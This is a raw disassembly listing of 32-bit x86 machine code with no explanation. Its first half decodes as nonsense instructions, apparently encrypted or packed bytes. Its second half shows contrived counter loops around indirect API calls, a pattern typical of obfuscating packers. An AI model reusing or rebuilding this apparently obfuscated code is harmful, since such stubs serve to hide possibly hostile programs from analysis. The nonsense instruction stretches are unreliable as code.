  40488f:	jmp    0xba90:0x8e9e89ae
  404896:	sub    ebp,DWORD PTR [esi-0x73cb980d]
  40489c:	mov    ?,WORD PTR [eax]
  40489e:	jo     0x40488b
  4048a0:	fwait
  4048a1:	lds    edi,FWORD PTR [ebx-0x2d441ff3]
  4048a7:	gs mov ah,0x27
  4048aa:	sbb    DWORD PTR [edi+0x29],edx
  4048ad:	sbb    BYTE PTR [ebx-0x42],bl
  4048b0:	in     eax,dx
  4048b1:	push   esi
  4048b2:	adc    DWORD PTR [ebp-0x473004c],eax
  4048b8:	pop    edi
  4048b9:	(bad)  
  4048ba:	(bad)  
  4048bb:	xor    BYTE PTR [eax+0x443c4a2d],bh
  4048c1:	into   
  4048c2:	ja     0x4048b8
  4048c4:	pop    esp
  4048c5:	dec    edi
  4048c6:	pop    ss
  4048c7:	div    DWORD PTR [edi+0x7e0dfca6]
  4048cd:	add    eax,0x3aea31b
  4048d2:	cli    
  4048d3:	idiv   BYTE PTR [edi-0x3]
  4048d6:	pop    ss
  4048d7:	shl    eax,1
  4048d9:	xchg   ecx,eax
  4048da:	jne    0x4048b7
  4048dc:	js     0x40492c
  4048de:	cmc    
  4048df:	test   eax,0x64262ef2
  4048e4:	mov    ebx,0x1ba0ec65
  4048e9:	cmp    BYTE PTR [ecx-0x5a],bh
  4048ec:	add    ecx,0x38
  4048ef:	ror    edx,1
  4048f1:	iret   
  4048f2:	jnp    0x40496c
  4048f4:	enter  0xe35f,0xeb
  4048f8:	jne    0x404881
  4048fa:	mov    cl,0xce
  4048fc:	push   edi
  4048fd:	ror    edx,0xb0
  404900:	dec    eax
  404901:	clc    
  404902:	dec    ebp
  404903:	and    al,0x57
  404905:	mov    esp,ecx
  404907:	jecxz  0x4048fa
  404909:	dec    ecx
  40490a:	inc    esi
  40490c:	xor    eax,0x909ddbeb
  404911:	inc    esi
  404912:	mov    ebx,0x5d921bb7
  404917:	adc    eax,0xf5f9eb2a
  40491c:	and    eax,0xecb8a03d
  404921:	call   edx
  404923:	test   DWORD PTR [edx],eax
  404925:	push   es
  404926:	fcom   DWORD PTR [edx-0x2a]
  404929:	stos   DWORD PTR es:[edi],eax
  40492a:	pop    ebx
  40492b:	test   edx,0x2dd1ea98
  404931:	fldcw  WORD PTR [eax-0x38c5149a]
  404937:	and    ebp,ecx
  404939:	inc    esp
  40493a:	xchg   esi,eax
  40493b:	sub    DWORD PTR [edi],ebp
  40493d:	lahf   
  40493e:	cli    
  40493f:	imul   esp,DWORD PTR [edi],0x5b20f659
  404945:	fild   WORD PTR [edi]
  404947:	mov    fs,eax
  404949:	retf   0xdc31
  40494c:	pop    esp
  40494d:	stos   BYTE PTR es:[edi],al
  40494e:	pop    ds
  40494f:	idiv   BYTE PTR [edx]
  404951:	mov    BYTE PTR [eax+eiz*1+0x71772197],bl
  404958:	and    al,0x27
  40495a:	mov    ah,0x38
  40495c:	js     0x4048f2
  40495e:	sbb    DWORD PTR [esi+esi*8+0x47b1a0b5],0xf1086bad
  404969:	and    al,0x81
  40496b:	in     eax,dx
  40496c:	(bad)  
  40496d:	icebp  
  40496e:	jp     0x404989
  404970:	enter  0x5fa2,0x28
  404974:	mov    ecx,0xdb001165
  404979:	in     al,0x64
  40497b:	cmp    eax,0x7f8ae6a8
  404980:	pop    esi
  404981:	xchg   bl,ch
  404983:	mov    eax,ds:0xe7bc5b65
  404988:	jecxz  0x404949
  40498a:	xor    edi,DWORD PTR [edi+esi*2]
  40498d:	clc    
  40498e:	add    BYTE PTR [edi+0x4361bff0],0xc7
  404995:	pop    edx
  404996:	xor    eax,0x66f5813b
  40499b:	imul   BYTE PTR ds:[edi]
  40499e:	leave  
  40499f:	call   0xdd8f:0x5e2f70ff
  4049a6:	inc    esp
  4049a7:	jl     0x4049d2
  4049a9:	ds cdq 
  4049ab:	cs mov esp,0x96c9c441
  4049b1:	in     eax,0xca
  4049b3:	xor    eax,0x88c6b587
  4049b8:	sbb    esi,edx
  4049ba:	xchg   ebx,eax
  4049bb:	sbb    cl,dh
  4049bd:	imul   esi,ecx,0xffffffe3
  4049c0:	call   0xc25ab229
  4049c5:	fdivr  QWORD PTR [edi+0x1dc736ba]
  4049cb:	sar    BYTE PTR [edx+0x68],1
  4049ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049cf:	shl    BYTE PTR [esi],cl
  4049d1:	xchg   BYTE PTR [eax+eiz*2-0x1be6a241],dh
  4049d8:	out    0x56,al
  4049da:	mov    eax,ds:0xf8d3472f
  4049df:	sbb    DWORD PTR [edi+0x3a63e1f7],ecx
  4049e5:	mov    BYTE PTR [eax],bl
  4049e7:	adc    DWORD PTR [ebp+0x5f0e3757],0x63
  4049ee:	fcomp  DWORD PTR [ebx]
  4049f0:	mov    al,0x5b
  4049f2:	jp     0x4049fc
  4049f4:	pop    edx
  4049f5:	add    DWORD PTR [esi-0x50169da1],ebp
  4049fb:	cdq    
  4049fc:	sbb    al,0x1e
  4049fe:	(bad)  
  4049ff:	push   cs
  404a00:	test   ah,0xa5
  404a03:	ror    DWORD PTR [ecx*2+0x79fd4e88],1
  404a0a:	pop    es
  404a0b:	pusha  
  404a0c:	aaa    
  404a0d:	sub    eax,ecx
  404a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a10:	add    eax,0x45784b09
  404a15:	mov    esi,0x3630204a
  404a1a:	inc    ecx
  404a1b:	ror    bl,cl
  404a1d:	adc    bl,BYTE PTR [edi-0x76302ce2]
  404a23:	xor    ebx,ecx
  404a25:	das    
  404a26:	add    al,0xc8
  404a28:	js     0x404a42
  404a2a:	hlt    
  404a2b:	mov    ch,0x1c
  404a2d:	aad    0x13
  404a2f:	ret    
  404a30:	push   eax
  404a31:	ja     0x404a94
  404a33:	jg     0x404a15
  404a35:	(bad)  
  404a39:	mov    al,0x13
  404a3b:	sbb    DWORD PTR [ebp-0x1d],ebx
  404a3e:	leave  
  404a3f:	sub    al,BYTE PTR [ecx-0x7e0bda14]
  404a45:	cmp    DWORD PTR [edi+0x10],edx
  404a48:	mov    esp,0x635a9a2b
  404a4d:	pop    edi
  404a4e:	inc    edi
  404a4f:	xor    al,0x15
  404a51:	into   
  404a52:	mov    esi,0xc9c867bb
  404a57:	mov    al,ds:0x7c943f30
  404a5c:	cmp    DWORD PTR ds:0x270c70f1,edx
  404a62:	popf   
  404a63:	fist   DWORD PTR [ebx+0x4dc44243]
  404a69:	pop    edi
  404a6a:	push   0xffffffd0
  404a6c:	cmp    eax,0xb59194b4
  404a71:	cmp    eax,0x7af736cd
  404a76:	mov    bh,0x60
  404a78:	pop    esp
  404a79:	push   esp
  404a7a:	scas   al,BYTE PTR es:[edi]
  404a7b:	stc    
  404a7c:	push   DWORD PTR [ecx-0x61603e20]
  404a82:	add    al,0xab
  404a84:	inc    eax
  404a85:	ret    0x34df
  404a88:	call   0xdacd0ef4
  404a8d:	mov    ds:0xeeac89a7,al
  404a92:	shr    bh,cl
  404a94:	xchg   ebp,eax
  404a95:	aam    0x24
  404a97:	push   ss
  404a98:	mov    ebp,0xc5d1d452
  404a9d:	pop    ebx
  404a9e:	and    eax,0xf5f7f191
  404aa3:	cmp    DWORD PTR [esi],ecx
  404aa5:	jge    0x404ac2
  404aa7:	mov    bh,0xbb
  404aa9:	leave  
  404aaa:	iret   
  404aab:	mov    ecx,0xca38ef7a
  404ab0:	enter  0x4672,0x33
  404ab4:	sub    ah,BYTE PTR [esi]
  404ab6:	mov    edi,0xbde639fb
  404abb:	dec    eax
  404abc:	loope  0x404b10
  404abe:	imul   esi,ebx,0xffffffaf
  404ac1:	jmp    0x404a8e
  404ac3:	push   ebx
  404ac4:	sti    
  404ac5:	cmp    edi,DWORD PTR [edi-0x80]
  404ac8:	mov    edx,0xa5d1d3aa
  404acd:	dec    ebx
  404ace:	jecxz  0x404a50
  404ad0:	int    0xa4
  404ad2:	xor    al,0xd6
  404ad4:	call   0xd755:0x10018ae9
  404adb:	fwait
  404adc:	mov    bl,0x4
  404ade:	xchg   ebp,eax
  404adf:	shl    DWORD PTR [edi+ebp*4-0x7e],1
  404ae3:	add    dl,BYTE PTR [ecx+0x42e7ade4]
  404ae9:	mov    eax,DWORD PTR [esi-0x7f]
  404aec:	stc    
  404aed:	dec    BYTE PTR [eax-0x7]
  404af0:	xchg   edx,eax
  404af1:	xchg   edx,eax
  404af2:	call   0xafa1:0x94b4339b
  404af9:	sub    BYTE PTR [esp+ecx*2-0x280b7799],0xf3
  404b01:	pusha  
  404b02:	(bad)  
  404b03:	mov    ecx,DWORD PTR [esi]
  404b05:	or     ecx,edi
  404b07:	dec    edx
  404b08:	out    0xca,eax
  404b0a:	cmp    DWORD PTR [edi+0x5f],ebx
  404b0d:	cli    
  404b0e:	call   0x4390503d
  404b13:	mov    edi,ebx
  404b15:	xor    al,0x8e
  404b17:	jbe    0x404ace
  404b19:	xor    cl,BYTE PTR [esi-0x29]
  404b1c:	mov    dh,0x3b
  404b1e:	popf   
  404b1f:	dec    eax
  404b20:	jns    0x404b9e
  404b22:	and    al,0xe1
  404b24:	fwait
  404b25:	lods   al,BYTE PTR ds:[esi]
  404b26:	int    0xa1
  404b28:	call   0x287c:0x4e64f300
  404b2f:	sahf   
  404b30:	inc    ecx
  404b31:	std    
  404b32:	add    dh,al
  404b34:	es jbe 0x404b2e
  404b37:	push   edx
  404b38:	addr16 popw es
  404b3b:	jle    0x404b28
  404b3d:	out    0xe2,al
  404b3f:	sub    BYTE PTR [edx+0x14],0x6d
  404b43:	ins    DWORD PTR es:[edi],dx
  404b44:	add    eax,0xfa7acb00
  404b49:	fsubp  st(7),st
  404b4b:	add    eax,edx
  404b4d:	mov    al,0xbc
  404b4f:	retf   
  404b50:	push   ss
  404b51:	xor    BYTE PTR [eax-0x9eea73e],cl
  404b57:	inc    eax
  404b58:	mov    ebx,DWORD PTR [eax]
  404b5a:	mov    ds:0x339b77a3,eax
  404b5f:	arpl   bx,bx
  404b61:	imul   edi,DWORD PTR [edx],0x51fb663e
  404b67:	addr16 pop ebp
  404b69:	pop    eax
  404b6a:	dec    ecx
  404b6b:	add    esp,0xffffff87
  404b6e:	pop    ebp
  404b6f:	and    DWORD PTR [edx-0x1d],ecx
  404b72:	cmp    edx,0xffffffa2
  404b75:	ret    
  404b76:	mov    esp,0xf56cc3ed
  404b7b:	add    al,0x5d
  404b7d:	cmc    
  404b7e:	sub    al,0xf1
  404b80:	jmp    0x404bf2
  404b82:	loopne 0x404b0d
  404b84:	repnz outs dx,DWORD PTR ds:[esi]
  404b86:	sbb    DWORD PTR [ebp-0x39],eax
  404b89:	jecxz  0x404b5e
  404b8b:	adc    DWORD PTR [edi+eax*8],edi
  404b8e:	scas   al,BYTE PTR es:[edi]
  404b8f:	mov    ah,0x50
  404b91:	dec    ebx
  404b92:	call   0xa5f9e64c
  404b97:	mov    WORD PTR [eax+0x567c9df0],fs
  404b9d:	icebp  
  404b9e:	inc    ebx
  404b9f:	arpl   sp,bp
  404ba1:	adc    esi,esi
  404ba3:	push   ebx
  404ba4:	inc    edx
  404ba5:	pop    es
  404ba6:	popf   
  404ba7:	leave  
  404ba8:	sti    
  404ba9:	lds    eax,FWORD PTR [ecx+0x5990b758]
  404baf:	outs   dx,BYTE PTR ds:[esi]
  404bb0:	scas   eax,DWORD PTR es:[edi]
  404bb1:	dec    edi
  404bb2:	xor    al,0x76
  404bb4:	shl    DWORD PTR [eax-0xba33ae1],cl
  404bba:	mov    dh,0x22
  404bbc:	xor    BYTE PTR [eax-0x5f137859],ch
  404bc2:	xor    eax,0x8153c5d4
  404bc7:	outs   dx,DWORD PTR ds:[esi]
  404bc8:	or     DWORD PTR [eax],ebx
  404bca:	dec    esp
  404bcb:	mov    ebp,0x9bcdda42
  404bd0:	sub    eax,0x5f7fdd84
  404bd5:	jnp    0x404bd6
  404bd7:	ins    BYTE PTR es:[edi],dx
  404bd8:	(bad)  
  404bd9:	addr16 inc ebx
  404bdb:	lahf   
  404bdc:	lds    esi,FWORD PTR [esi]
  404bde:	lods   al,BYTE PTR ds:[esi]
  404bdf:	shr    al,cl
  404be1:	enter  0x4d08,0x52
  404be5:	jo     0x404b71
  404be7:	out    0xfc,eax
  404be9:	push   esi
  404bea:	jle    0x404b8f
  404bec:	pop    ds
  404bed:	clc    
  404bee:	inc    ebx
  404bef:	pop    ebx
  404bf0:	pop    esp
  404bf1:	repz repz or cl,BYTE PTR [eax+0x22]
  404bf6:	nop
  404bf7:	lea    ebp,[edx-0x44]
  404bfa:	mov    cl,0x52
  404bfc:	aam    0xba
  404bfe:	rol    DWORD PTR [ebx+0x486f4c39],1
  404c04:	js     0x404c52
  404c06:	lahf   
  404c07:	jnp    0x404c6d
  404c09:	jnp    0x404c44
  404c0b:	addr16 pop ebp
  404c0d:	imul   edi,DWORD PTR [eax],0x4b
  404c10:	fwait
  404c11:	(bad)  
  404c12:	lock inc ecx
  404c14:	ins    BYTE PTR es:[edi],dx
  404c15:	pop    ebp
  404c16:	rol    bl,1
  404c18:	and    eax,0x7c3b4fb7
  404c1d:	mov    ebx,0xefe5fd64
  404c22:	scas   al,BYTE PTR es:[edi]
  404c23:	push   ss
  404c24:	das    
  404c25:	icebp  
  404c26:	xchg   edi,eax
  404c27:	lods   al,BYTE PTR ds:[esi]
  404c28:	aam    0x10
  404c2a:	stc    
  404c2b:	cld    
  404c2c:	fmul   QWORD PTR [edi+0x6b]
  404c2f:	mov    ebx,0x99c31424
  404c34:	jmp    0xdb11b2ab
  404c39:	dec    edx
  404c3a:	inc    edi
  404c3b:	imul   edx,esp,0xdbe52482
  404c41:	xchg   ebp,eax
  404c42:	cmp    edi,DWORD PTR [ebx+0x57]
  404c45:	dec    edi
  404c46:	pop    edi
  404c47:	ret    
  404c48:	fldcw  WORD PTR [ecx-0x576bde9b]
  404c4e:	add    esi,DWORD PTR ds:0x45efc329
  404c54:	jmp    0x45b7cd19
  404c59:	hlt    
  404c5a:	inc    eax
  404c5b:	ror    DWORD PTR ds:0xc1539235,cl
  404c61:	sub    esi,DWORD PTR [ecx+ebx*8]
  404c64:	outs   dx,BYTE PTR ds:[esi]
  404c65:	xchg   ebx,eax
  404c66:	cmp    DWORD PTR [ebx],esi
  404c68:	adc    ah,cl
  404c6a:	retf   
  404c6b:	dec    edi
  404c6c:	sub    al,0xd2
  404c6e:	es mov edx,0xb00d3468
  404c74:	jg     0x404c81
  404c76:	inc    edi
  404c77:	aam    0x2c
  404c79:	cmc    
  404c7a:	or     al,0x84
  404c7c:	les    edi,FWORD PTR [eax+edx*8]
  404c7f:	inc    ebp
  404c80:	imul   esp,edi,0x24e44d59
  404c86:	shr    al,1
  404c88:	out    dx,eax
  404c89:	mov    dh,0x8e
  404c8b:	dec    esi
  404c8c:	jbe    0x404c55
  404c8e:	sbb    al,0xd7
  404c90:	push   cs
  404c91:	fwait
  404c92:	mov    bh,0x62
  404c94:	out    dx,al
  404c95:	stos   DWORD PTR es:[edi],eax
  404c96:	xlat   BYTE PTR ds:[ebx]
  404c97:	mov    ch,0xb9
  404c99:	sti    
  404c9a:	(bad)  
  404c9b:	pop    edx
  404c9c:	xlat   BYTE PTR ds:[ebx]
  404c9d:	scas   al,BYTE PTR es:[edi]
  404c9e:	inc    edi
  404c9f:	ja     0x404c3a
  404ca1:	adc    BYTE PTR [ebp-0x1e],0x8c
  404ca5:	test   DWORD PTR [eax-0x797c4668],esp
  404cab:	sub    cl,dl
  404cad:	stc    
  404cae:	add    eax,edx
  404cb0:	lods   al,BYTE PTR ds:[esi]
  404cb1:	mov    cl,0xe8
  404cb3:	lods   eax,DWORD PTR ds:[esi]
  404cb4:	ss jbe 0x404ca1
  404cb7:	cmp    DWORD PTR [esp+edi*4-0x304adee4],edx
  404cbe:	leave  
  404cbf:	xchg   ebp,eax
  404cc0:	nop
  404cc1:	test   BYTE PTR [edx+ecx*8-0x219e5ee9],bh
  404cc8:	pushf  
  404cc9:	push   edi
  404cca:	test   eax,0x5e76d766
  404ccf:	mov    dh,cl
  404cd1:	int    0x2a
  404cd3:	out    0xff,eax
  404cd5:	aam    0xab
  404cd7:	pop    edi
  404cd8:	stos   BYTE PTR es:[edi],al
  404cd9:	pop    es
  404cda:	je     0x404c71
  404cdc:	add    al,0x33
  404cde:	xchg   ebp,eax
  404cdf:	sbb    eax,0x43
  404ce2:	add    al,0x2c
  404ce4:	xchg   ebp,eax
  404ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce6:	loopne 0x404c7c
  404ce8:	push   ds
  404ce9:	and    eax,DWORD PTR fs:[edi+0x0]
  404ced:	aas    
  404cee:	enter  0x591a,0x16
  404cf2:	mov    bl,BYTE PTR [esi-0x28418f17]
  404cf8:	inc    ecx
  404cf9:	push   0xa
  404cfb:	es fwait
  404cfd:	mov    al,0xc7
  404cff:	push   esp
  404d00:	jb     0x404d01
  404d02:	mov    gs,WORD PTR [esi+0x4d]
  404d05:	aad    0xe4
  404d07:	add    BYTE PTR [eax+0x5fdeefda],dh
  404d0d:	xchg   ebx,eax
  404d0e:	sub    DWORD PTR [edi-0x7de1e91a],ecx
  404d14:	retf   
  404d15:	ss aas 
  404d17:	push   ecx
  404d18:	inc    eax
  404d19:	pop    edi
  404d1a:	sbb    al,0x23
  404d1c:	into   
  404d1d:	xchg   esp,eax
  404d1e:	add    eax,0xf490cafd
  404d23:	add    bl,dh
  404d25:	inc    eax
  404d26:	int    0x97
  404d28:	xchg   esi,eax
  404d29:	pop    eax
  404d2a:	mov    esi,0x616ba692
  404d2f:	add    ecx,edx
  404d31:	sub    al,0xb3
  404d33:	jle    0x404cbd
  404d35:	mov    cs,esi
  404d37:	loopne 0x404cc0
  404d39:	and    eax,esp
  404d3b:	inc    eax
  404d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d3d:	pop    edx
  404d3e:	call   0xb2a3:0xff345f39
  404d45:	addr16 sbb eax,0xdbc4b1b7
  404d4b:	pop    es
  404d4c:	mov    esi,eax
  404d4e:	(bad)  
  404d4f:	lea    eax,[edi-0x64]
  404d52:	int3   
  404d53:	(bad)  
  404d54:	mov    dh,0x4b
  404d56:	loop   0x404d15
  404d58:	mov    ds:0x19533f7d,eax
  404d5d:	in     eax,0x19
  404d5f:	push   eax
  404d60:	jecxz  0x404d21
  404d62:	into   
  404d63:	inc    ebp
  404d64:	imul   esi,DWORD PTR [ecx+0x3ab386],0xffffffe9
  404d6b:	jno    0x404da7
  404d6d:	xchg   esi,eax
  404d6e:	inc    esp
  404d70:	add    edx,DWORD PTR [ebx+ebp*1+0x7c]
  404d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d75:	std    
  404d76:	daa    
  404d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d78:	fwait
  404d79:	out    0x68,eax
  404d7b:	sub    DWORD PTR [eax],ecx
  404d7d:	inc    eax
  404d7e:	popa   
  404d7f:	cs dec esp
  404d81:	cmp    DWORD PTR [eax-0x733294f6],ebp
  404d87:	inc    edx
  404d88:	inc    ebx
  404d89:	jecxz  0x404de9
  404d8b:	retf   
  404d8c:	dec    esp
  404d8d:	fs out dx,eax
  404d8f:	push   edx
  404d90:	adc    al,0x16
  404d92:	popf   
  404d93:	push   eax
  404d94:	dec    edx
  404d95:	std    
  404d96:	adc    al,0x3e
  404d98:	jge    0x404d2b
  404d9a:	pop    ebx
  404d9b:	inc    ebx
  404d9c:	loop   0x404dfd
  404d9e:	push   ecx
  404d9f:	mov    ah,0xd0
  404da1:	cmp    bl,BYTE PTR [ebx+0x4ad097f5]
  404da7:	mul    BYTE PTR [edi]
  404da9:	ficom  WORD PTR [ecx+0x2c]
  404dac:	inc    ebp
  404dad:	outs   dx,BYTE PTR ds:[esi]
  404dae:	ss cli 
  404db0:	jmp    0x46c:0x1fdb7216
  404db7:	pop    ss
  404db8:	jge    0x404d50
  404dba:	jg     0x404d5b
  404dbc:	push   ecx
  404dbd:	push   esp
  404dbe:	popf   
  404dbf:	push   eax
  404dc0:	js     0x404e24
  404dc2:	cs repz jg 0x404d85
  404dc6:	div    bl
  404dc8:	addr16 out 0x78,eax
  404dcb:	cld    
  404dcc:	nop
  404dcd:	(bad)  
  404dce:	in     al,0x40
  404dd0:	sbb    al,0x30
  404dd2:	fs push ds
  404dd4:	mov    edx,0x68b08b67
  404dd9:	or     eax,0xe3275c9a
  404dde:	outs   dx,BYTE PTR ds:[esi]
  404ddf:	shl    DWORD PTR [edi-0x19d41590],0x16
  404de6:	out    0xb1,al
  404de8:	pushf  
  404de9:	outs   dx,BYTE PTR ds:[esi]
  404dea:	mov    ecx,0xedb9b726
  404def:	fmul   DWORD PTR [ebx]
  404df1:	dec    esi
  404df2:	mov    ds:0x1d13e05b,al
  404df7:	inc    edx
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
